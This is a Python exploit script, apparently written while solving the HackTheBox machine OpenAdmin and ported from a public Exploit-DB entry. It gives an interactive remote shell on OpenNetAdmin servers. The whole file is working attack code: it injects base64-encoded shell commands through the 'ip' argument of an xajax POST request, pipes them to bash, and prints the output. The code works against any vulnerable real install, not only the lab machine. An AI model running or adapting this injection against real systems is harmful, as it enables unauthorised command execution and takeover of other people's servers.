# Python implementation of the exploit: https://www.exploit-db.com/exploits/47691
# Made during the exploitation of the HackTheBox machine: OpenAdmin
# Author: c0rnf13ld

import re
import sys
import requests
import threading
import os
from base64 import b64encode

if len(sys.argv) != 2:
	print(f"Usage: python3 {sys.argv[0]} <url>")
	sys.exit(1)

# Global Variables
main_url = sys.argv[1]
burp = {'http' : 'http://127.0.0.1:8080'}

def makeRequest(cmd):

	post_data = {
		'xajax' : 'window_submit',
		'xajaxargs[]' : ['tooltips', f'ip=>;echo "BEGING";echo "{cmd}" | base64 -d | bash 2>&1; echo "END";', 'ping']
	}

	r = requests.post(main_url, data=post_data)
	try:
		regex = re.findall('BEGING\n(?:.*?\n)+END\n', r.text)[0]
		regex = regex.replace("BEGING\n", "")
		regex = regex.replace("END\n", "")
		print(regex)

	except IndexError:
		pass

def cmdToBase64(cmd):
	cmd = cmd.encode()
	cmd = b64encode(cmd).decode()
	return cmd

if __name__ == '__main__':

	print("Type exit to exit the web shell\nType clear to clear the screen\nEnjoy it :)")
	while True:
		cmd = input("$ ")
		if cmd == "exit":
			print("$ logout")
			sys.exit(0)

		if cmd == "clear":
			os.system("clear")
			continue
		cmd_ = cmdToBase64(cmd)
		makeRequest(cmd_)
